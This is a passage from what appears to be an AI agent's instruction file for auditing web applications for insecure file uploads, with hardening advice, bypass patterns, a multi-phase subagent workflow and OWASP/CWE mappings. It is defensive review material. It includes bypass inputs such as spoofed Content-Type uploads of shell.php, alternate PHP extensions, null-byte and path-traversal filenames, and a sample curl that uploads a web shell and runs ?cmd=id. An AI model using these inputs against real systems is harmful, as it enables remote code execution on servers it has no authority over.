- Reject unexpected archive formats.
- Validate every entry path, reject traversal sequences, enforce max uncompressed size and entry count.
- Extract into a temporary sandbox before moving validated files.

### 12. Object-Storage Hardening

- Never use `public-read` ACLs for user uploads.
- Use pre-signed URLs with short expiration for authorized downloads.
- Block public access at the bucket level.

### 13. Logging and Monitoring

- Log every upload: timestamp, user, source IP, filename, size, MIME type, extension, and storage path.
- Alert on repeated failed uploads, oversized files, or uploads of executable extensions.
- Monitor downstream systems (queues, processors) for anomalies.

***

## Modern Bypass Patterns & Watch-outs
[ref: #fileupload-modern-bypasses]

Beyond the classic catalog, assess these modern patterns in cloud-native, containerized, and API-first applications.

### A. Presigned-URL Upload Abuse

Applications that issue presigned URLs for direct browser-to-S3 uploads may fail to enforce the same allowlist on the callback/metadata endpoint. Verify that the server validates the final stored object after upload.

**Watch-out**: The presigned URL itself may restrict `Content-Type` or object key, but if the client can modify metadata after upload, extension validation can be bypassed.

### B. GraphQL Multipart Uploads

GraphQL mutations accepting base64-encoded files or multipart uploads may bypass framework-level file filters because the parser sees a string, not a `File` object.

**Watch-out**: Decode base64 payloads and apply the same extension/magic-byte checks as for multipart uploads.

### C. Serverless / Function-as-a-Service Upload Handlers

Lambda, Cloud Functions, or Azure Functions may write uploads to ephemeral `/tmp` first. If the function later copies `/tmp/{filename}` to persistent storage, path traversal or symlink attacks become relevant.

**Watch-out**: Validate filenames before writing to `/tmp` and before copying to the final destination.

### D. Image Optimization Pipelines

Services that resize, convert, or compress images may re-derive the output extension from the input filename. A file named `shell.jpg.php` may be converted to `shell.jpg` but metadata may persist or the original may still be reachable.

**Watch-out**: Inspect both original and processed storage paths.

### E. API Gateways and WAF Bypass

WAFs often inspect the first few bytes or the declared `Content-Type`. A file uploaded with a benign `Content-Type` but a dangerous extension may pass the WAF but be executed by the origin.

**Watch-out**: Do not assume WAF rules replace server-side validation.

### F. JSON / FormData Filename Injection

When the upload is sent as JSON or FormData, the `filename` field may contain newline characters (`\n`), quotes, or path separators that break downstream parsers, log formats, or email headers.

**Watch-out**: Sanitize the filename before using it in logs, headers, emails, or database queries.

### G. Client-Driven Chunked / Resumable Uploads

Resumable uploads (tus, S3 multipart) may allow the client to set the final object key or metadata after the bytes are already stored. Validate metadata at completion, not only at initiation.

**Watch-out**: Check the completion/callback endpoint with the same strictness as a synchronous upload.

### H. Multipart Parser Differentials

Framework and proxy multipart parsers disagree on parameter handling, boundary recognition, and encoding — a request crafted for that gap passes one layer's validation and reaches the next layer parsed differently (PortSwigger top-10 technique, 2024–2025).

- Duplicated `filename` / `Content-Disposition` parameters — one parser takes the first occurrence, another takes the last.
- Boundary tricks: extra dashes, a missing final delimiter, or boundary strings one parser tolerates and another rejects.
- Alternate encodings or charset quirks in parameter values that change how the filename is extracted.
- Differentials between the WAF/gateway parser and the application parser — the WAF sees a benign part while the app sees the shell.

**Watch-out**: test the exact proxy+framework chain, not the framework alone; prefer framework-native upload handling over hand-rolled multipart parsing; never parse multipart bodies with regex or string splitting.

***

## Execution
[ref: #fileupload-execution]

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Find All File Upload Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where files uploaded by users are received and stored. Write results to `{{ REPORTS_ROOT }}/11_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the framework, file storage patterns, and whether uploads go to local disk, cloud storage, or a CDN.
>
> **What to search for — file upload handling patterns**:
>
> Look for any code that receives a file from an HTTP request and writes or stores it. Do not yet evaluate whether validation is present — just find all the sites.
>
> 1. **Python / Django**:
>    - `request.FILES` access
>    - `InMemoryUploadedFile`, `TemporaryUploadedFile`
>    - `default_storage.save(...)`, `FileSystemStorage().save(...)`
>    - Model `FileField` / `ImageField` form submissions
>    - `shutil.copyfileobj(f, dest)` or manual `.write(f.read())` on uploaded data
>
> 2. **Python / Flask**:
>    - `request.files.get(...)` or `request.files[...]`
>    - `file.save(...)` calls on a `FileStorage` object
>    - `werkzeug` `FileStorage` handling
>
> 3. **Node.js**:
>    - `multer` middleware: `upload.single(...)`, `upload.array(...)`, `upload.fields(...)`
>    - `busboy`, `formidable`, `multiparty` form parsing
>    - `express-fileupload`: `req.files`
>    - `fs.writeFile` / `fs.createWriteStream` / `pipe()` called with a request stream
>
> 4. **PHP**:
>    - `$_FILES` access
>    - `move_uploaded_file(...)` calls
>    - `copy($_FILES[...]['tmp_name'], ...)`
>
> 5. **Java / Spring**:
>    - `MultipartFile` parameters in controller methods: `@RequestParam MultipartFile`
>    - `CommonsMultipartFile`, `StandardMultipartFile`
>    - `Part.write(...)` (Servlet API)
>    - `file.transferTo(...)`, `Files.write(path, file.getBytes())`
>
> 6. **Go**:
>    - `r.FormFile(...)` or `r.MultipartForm.File`
>    - `io.Copy(dst, file)` where `file` comes from a multipart form
>    - `os.Create(...)` called with a filename derived from `header.Filename`
>
> 7. **Ruby / Rails**:
>    - `params[:file]` with `.read`, `.original_filename`, `.tempfile`
>    - `File.open(..., 'wb')` called with uploaded data
>    - `has_one_attached` / `has_many_attached` (ActiveStorage)
>    - CarrierWave `mount_uploader`, Shrine `include Shrine::Attachment`
>
> 8. **C# / ASP.NET**:
>    - `IFormFile` parameters: `file.CopyToAsync(...)`, `file.OpenReadStream()`
>    - `HttpPostedFileBase.SaveAs(...)`
>    - `Request.Files[...]`
>
> **Output format** — write to `{{ REPORTS_ROOT }}/11_recon.md`:
>
> ```markdown
> # File Upload Recon: [Project Name]
>
> ## Summary
> Found [N] file upload sites.
>
> ## Upload Sites
>
> ### 1. [Descriptive name — e.g., "Avatar upload endpoint"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Framework / method**: [e.g., Flask request.files / multer / move_uploaded_file]
> - **Storage destination**: [path, variable, or storage abstraction — e.g., "static/uploads/" or "S3 via boto3" or "unknown"]
> - **Validation observed** (preliminary, Phase 2 will analyze in depth): [list any extension checks, content-type checks, or "none visible"]
> - **Code snippet**:
>   ```
>   [the upload receive and save code]
>   ```
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/11_recon.md`. If the recon found **zero upload sites** (the summary reports "Found 0" or the "Upload Sites" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/11_fileupload.md` and stop:

```markdown
# File Upload Analysis Results

No file upload sites found.
```

Only proceed to Phase 2 if Phase 1 found at least one upload site.

### Phase 2: Check for Extension Bypass Vulnerabilities (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/11_recon.md` and split the upload sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent analyzes only its assigned sites and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `{{ REPORTS_ROOT }}/11_recon.md` and count the numbered site sections (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 8 sites → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/11_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the project uses Node.js with Multer, include only the "Node.js — Multer (Express)" examples. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned file upload site below, determine whether an attacker can upload a malicious file (e.g., a PHP web shell, a JSP shell, a Python script) by manipulating the filename, extension, or Content-Type header. Write results to `{{ REPORTS_ROOT }}/11_batch_[N].md`.
>
> **Your assigned upload sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand the framework, storage paths, and how uploads are served.
>
> **Reference — what insecure file upload is and is not**:
>
> Focus on execution or dangerous file types reaching storage without adequate controls. Do **not** flag stored XSS via SVG, SSRF via uploaded XML, DoS via size limits, or IDOR on download as file-upload execution issues (other skills cover those).
>
> **Patterns that reduce risk** — if you see a strong combination (allowlist, sanitization, non-web-root storage, UUID rename), the site is likely **Not Vulnerable** unless bypass still applies.
>
> **Vulnerable vs. Secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **For each upload site, evaluate the following bypass vectors**:
>
> 1. **No extension check**: No validation of any kind on the filename or extension. Any file is accepted. Immediately flag as **Vulnerable**.
>
> 2. **Content-Type / MIME header only**: Validation reads `Content-Type` or `mimetype` from the request headers but does not inspect the actual filename extension or file bytes. Attackers can set `Content-Type: image/png` while uploading `shell.php`. Flag as **Vulnerable**.
>
> 3. **Blocklist-based validation**: An explicit list of forbidden extensions. Check whether the blocklist is exhaustive for the server's technology:
>    - **PHP servers**: Are `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.shtml` also blocked? If any are missing, flag as **Vulnerable**.
>    - **Java servers**: Are `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf` also blocked?
>    - **ASP.NET servers**: Are `.asp`, `.aspx`, `.ashx`, `.asmx`, `.cer`, `.asa` also blocked?
>    - **Node.js**: Is `.js` execution possible via the server config? Check if `.js` files in the upload dir can be required/executed.
>    - Any blocklist is inherently weaker than an allowlist — flag as **Likely Vulnerable** even if seemingly complete.
>
> 4. **Case sensitivity bypass**: Blocking `.php` but not `.PHP`, `.Php`, `.pHp`. Check whether the comparison uses `.toLowerCase()` / `.lower()` / `strtolower()` / case-insensitive matching.
>
> 5. **Double extension / multi-extension**: `shell.php.jpg` — if the code extracts the extension using a method that takes the last segment after the last dot, this should be caught by an allowlist. However, on Apache servers with `AddHandler` misconfig, the leftmost recognized extension may be used for execution. Check how the extension is extracted:
>    - Safe: `filename.rsplit('.', 1)[-1]`, `path.extname(filename)` (takes the last extension)
>    - Risky server config: Apache `AddHandler application/x-httpd-php .php` — even `shell.php.jpg` may be executed as PHP
>
> 6. **Path traversal in filename**: If the original filename is used in the storage path without sanitization, `../../webroot/shell.php` can place files in unintended directories. Check for:
>    - Use of `secure_filename()`, `basename()`, `path.basename()`, `Path.GetFileName()`, or `filepath.Base()` — these strip directory separators and are safe
>    - Direct use of `file.filename`, `header.Filename`, `file.getOriginalFilename()`, `$_FILES['name']` in a path join without sanitization — flag as **Vulnerable**
>
> 7. **File stored in web-executable directory**: Even with a correct extension allowlist, if uploads go to a directory served by the web server (e.g., `static/uploads/`, `public/uploads/`, `wwwroot/uploads/`) and the web server is configured to execute scripts, a bypass in extension validation becomes critical. Note whether the storage path is web-accessible.
>
> 8. **No content-based validation (magic bytes)**: The server trusts the extension without verifying the actual file content. A file named `shell.jpg` with PHP code inside is still dangerous if the extension check can be bypassed and the server executes it. Note absence of magic-byte checking as a contributing weakness.
>
> 9. **Null-byte truncation**: Some runtimes stop parsing a filename at a null byte (`%00`). Test whether `shell.php%00.jpg` or `shell.jpg%00.php` is accepted and how it is stored.
>
> 10. **Polyglot files**: A valid image/document that also contains executable code. If the server re-derives the extension from a user field or executes files based on content, flag as **Likely Vulnerable**.
>
> 11. **Archive extraction**: If the site accepts ZIP/TAR/RAR/7z, check for ZipSlip (path traversal inside archive entries) and missing resource limits (archive bombs). Flag as **Vulnerable** if traversal is possible; **Likely Vulnerable** if limits are missing.
>
> 12. **Predictable / user-controlled filenames**: If the stored name is derived from user input, an incrementing ID, or a timestamp, an attacker may overwrite or access other users' files. Note this as a contributing factor.
>
> 13. **Third-party processing / unsafe API consumption**: If uploads are forwarded to ImageMagick, LibreOffice, ffmpeg, OCR, document converters, or external APIs without sandboxing or validation, note the risk and cross-reference the SSRF/unsafe-API-consumption skills. Do not flag as a pure upload RCE unless execution is proven.
>
> 14. **Object-storage public-read ACLs**: If uploads go to S3/GCS/Azure Blob with `public-read` ACL or a public bucket policy, flag as **Likely Vulnerable** (data exposure / indirect execution risk).
>
> 15. **Client-side validation bypass**: Any check that exists only in JavaScript, HTML `accept`, or mobile code is not a security control. Confirm the server repeats the validation.
>
> 16. **Race conditions / symlink attacks**: If the file is validated in one step and moved/copied in another, or if symlinks are followed, an attacker may swap the file between check and use. Flag as **Likely Vulnerable** if non-atomic.
>
> **Classification**:
> - **Vulnerable**: No validation at all, or a clearly bypassable check (content-type only, missing common extensions in blocklist, missing `.lower()`, path traversal in filename, null-byte truncation, symlink traversal, archive ZipSlip).
> - **Likely Vulnerable**: Blocklist that appears complete but is inherently weaker than an allowlist; or an allowlist with potential edge cases (e.g., does not account for uppercase extensions, missing magic-byte defense in depth, public ACL, third-party processing without sandboxing).
> - **Not Vulnerable**: Strict allowlist of safe extensions (applied case-insensitively), combined with filename sanitization and/or server-generated UUID rename, files stored outside web root or behind a controlled download endpoint, plus defense-in-depth controls such as size limits and magic-byte checks.
> - **Needs Manual Review**: Validation logic is in a shared helper or middleware that could not be fully read; or storage path is dynamic and could not be determined; or third-party processing makes execution impact unclear.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/11_batch_[N].md`:
>
> ```markdown
> # File Upload Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "No extension validation — any file type accepted" or "Content-Type header used as sole check"]
> - **Bypass vector**: [Exact technique — e.g., "Upload shell.php directly" or "Set Content-Type: image/png while uploading a .php file" or "Use .phtml extension not covered by blocklist"]
> - **Storage path**: [Where the file lands — web-accessible or not]
> - **Impact**: [e.g., "Attacker uploads PHP web shell and achieves RCE by accessing /uploads/shell.php"]
> - **Remediation**: [Specific fix — switch to allowlist, add `.lower()`, use secure_filename, move storage outside web root]
> - **Dynamic Test**:
>   ```
>   [curl or HTTP request demonstrating the bypass.
>    Example: curl -X POST https://app.example.com/upload \
>      -F "file=@shell.php;type=image/png" \
>      then access: https://app.example.com/static/uploads/shell.php?cmd=id]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "Blocklist-based extension check — inherently incomplete"]
> - **Bypass vector**: [Possible bypass — e.g., "Try .phtml, .phar, .php5 if server is Apache/PHP"]
> - **Storage path**: [Where the file lands]
> - **Concern**: [Why it's still a risk]
> - **Remediation**: [Replace blocklist with allowlist]
> - **Dynamic Test**:
>   ```
>   [payload to attempt bypass]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "Strict allowlist of png/jpg/gif with .lower(), UUID rename, stored outside web root"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why validation logic or storage path could not be determined]
> - **Suggestion**: [What to trace manually]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/11_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/11_fileupload.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/11_batch_1.md`, `{{ REPORTS_ROOT }}/11_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary (total sites analyzed equals the number from recon; counts per classification sum across batches).
4. Write the merged report to `{{ REPORTS_ROOT }}/11_fileupload.md` using this format:

```markdown
# File Upload Analysis Results: [Project Name]

## Executive Summary
- Upload sites analyzed: [total from recon]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/11_fileupload.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/11_batch_*.md`).

***

## OWASP API Security Top 10 2023 mapping
[ref: #fileupload-owasp-mapping]

This scan supports the following OWASP API Security Top 10 2023 risks:

| OWASP risk | Relationship to file uploads | Key scenarios |
|------------|------------------------------|---------------|
| **API4:2023 Unrestricted Resource Consumption** | Missing limits on file size, number of files, thumbnail generation, video transcoding, or archive decompression can exhaust CPU, memory, bandwidth, or storage and lead to Denial of Service or unexpected cloud costs. | Oversized uploads; batch uploads without count limits; image/PDF processing that allocates unbounded memory; archive bombs. |
| **API8:2023 Security Misconfiguration** | Upload handlers lack extension or content-type allowlists, store files in web-executable directories, use insecure default object-storage ACLs, expose verbose errors, or run outdated image-processing libraries with known vulnerabilities. | Executable upload directories; `public-read` S3 buckets; permissive CORS on upload endpoints; missing security headers on served uploads. |
| **API10:2023 Unsafe Consumption of APIs** | Uploaded files are forwarded to third-party scanning, OCR, media-processing, cloud-conversion, or malware-analysis APIs without TLS, validation, timeouts, redirect allowlists, or sandboxing. A compromised or malicious downstream service can return payloads that the application trusts and acts on. | ImageMagick / LibreOffice / ffmpeg processing; AV scanning APIs; document converters; presigned-URL callbacks. |

**Direct citations**:
- API4:2023 lists "Maximum upload file size" and "Number of operations to perform in a single API client request" as missing or inappropriate limits that make an API vulnerable to resource consumption. GraphQL profile-picture uploads that generate multiple thumbnails are given as an explicit attack scenario. [ref: owasp/0xa4-unrestricted-resource-consumption.md]
- API8:2023 states that an API is vulnerable when "security hardening is missing across any part of the API stack" or when there are "improperly configured permissions on cloud services". It calls out restricting incoming content types to those that meet business requirements. [ref: owasp/0xa8-security-misconfiguration.md]
- API10:2023 warns that developers "tend to trust data received from third-party APIs more than user input" and that APIs are vulnerable when they "do not properly validate and sanitize data gathered from other APIs prior to processing it". Uploads feeding external processors fit this pattern exactly. [ref: owasp/0xaa-unsafe-consumption-of-apis.md]

***

## CWE mapping
[ref: #fileupload-cwe-mapping]

The following CWE entries are directly relevant when assessing and reporting insecure file upload findings:

| CWE | Title | How it applies to file uploads |
|-----|-------|--------------------------------|
| **CWE-434** | Unrestricted Upload of File with Dangerous Type | Core weakness: accepting executable or dangerous files without adequate validation. |
| **CWE-22** | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Path traversal in uploaded filenames; ZipSlip during archive extraction; symlink attacks. |
| **CWE-400** | Uncontrolled Resource Consumption | Missing file-size, count, or processing limits leading to DoS or cost spikes. |
| **CWE-352** | Cross-Site Request Forgery (CSRF) | Upload endpoints that lack CSRF protection may allow attackers to force file uploads on behalf of authenticated users. |
| **CWE-502** | Deserialization of Untrusted Data | Uploading serialized objects (e.g., Java `.ser`, Python `pickle`, PHP `phar`) that are later deserialized. |
| **CWE-611** | Improper Restriction of XML External Entity Reference | Uploading XML, SVG, or Office documents that trigger XXE during parsing. |
| **CWE-918** | Server-Side Request Forgery (SSRF) | Image/document processors that fetch external resources based on uploaded file content. |
| **CWE-20** | Improper Input Validation | Trusting client-provided `Content-Type`, filenames, or metadata without server-side validation. |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor | Public-read object storage or predictable filenames leaking uploaded files. |
| **CWE-319** | Cleartext Transmission of Sensitive Information | Uploads or presigned-URL interactions sent over unencrypted channels. |
| **CWE-942** | Permissive Cross-domain Policy with Untrusted Domains | Overly permissive CORS on upload or download endpoints. |
| **CWE-770** | Allocation of Resources Without Limits or Throttling | No limits on upload frequency, total request size, or CPU/memory used for processing. |
| **CWE-798** | Use of Hard-coded Credentials | Hard-coded cloud-storage credentials or API keys in upload handlers. |

Use these CWE identifiers in findings to improve traceability and remediation guidance.

***

## Important Reminders
[ref: #fileupload-important-reminders]

- Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 upload sites per subagent**. If there are 1-3 sites total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sites' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely discovery**: find every place a user-supplied file is received and stored. Do not deeply analyze validation in Phase 1 — just note what is visible. That is Phase 2's job.
- **Phase 2 is purely bypass analysis**: for each assigned upload site, examine the validation logic and determine whether it can be bypassed through extension manipulation, case variation, content-type spoofing, path traversal, null-byte truncation, polyglot files, archive extraction, or other vectors in the catalog.
- **Phase 3 is merge only**: combine batch files into `{{ REPORTS_ROOT }}/11_fileupload.md` and remove intermediates; do not re-analyze code in Phase 3.
- An allowlist is always stronger than a blocklist. Any blocklist-based approach should be flagged as at minimum **Likely Vulnerable** because blocklists are almost always incomplete.
- Content-Type (MIME type from the HTTP header) is **fully attacker-controlled** — never treat it as a security control.
- Case sensitivity matters: `.PHP` bypasses a check for `.php` if `.toLowerCase()` is missing. Always check.
- Path traversal in filenames is a separate attack vector from extension bypass — check for both.
- Even a correct extension check is weakened if the file is stored in a web-executable directory. Note storage location in every finding.
- Magic byte checking (reading actual file bytes) is defense-in-depth but does not replace extension allowlisting — a valid image with PHP code appended can still be dangerous.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Clean up intermediate files: delete `{{ REPORTS_ROOT }}/11_recon.md` and all `{{ REPORTS_ROOT }}/11_batch_*.md` files after the final `{{ REPORTS_ROOT }}/11_fileupload.md` is written.
- **Subagents must not modify project source code, configuration, tests, or documentation.** All output goes to the report files under `{{ REPORTS_ROOT }}/`.

***

## References
[ref: #fileupload-references]

### OWASP

- [OWASP API Security Top 10 2023 — API4:2023 Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [OWASP API Security Top 10 2023 — API8:2023 Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [OWASP API Security Top 10 2023 — API10:2023 Unsafe Consumption of APIs](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- [OWASP Cheat Sheet Series — File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Cheat Sheet Series — Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP Web Security Testing Guide (WSTG) — Testing for File Upload](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Testing_for_File_Upload)

### CWE

- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-770: Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)
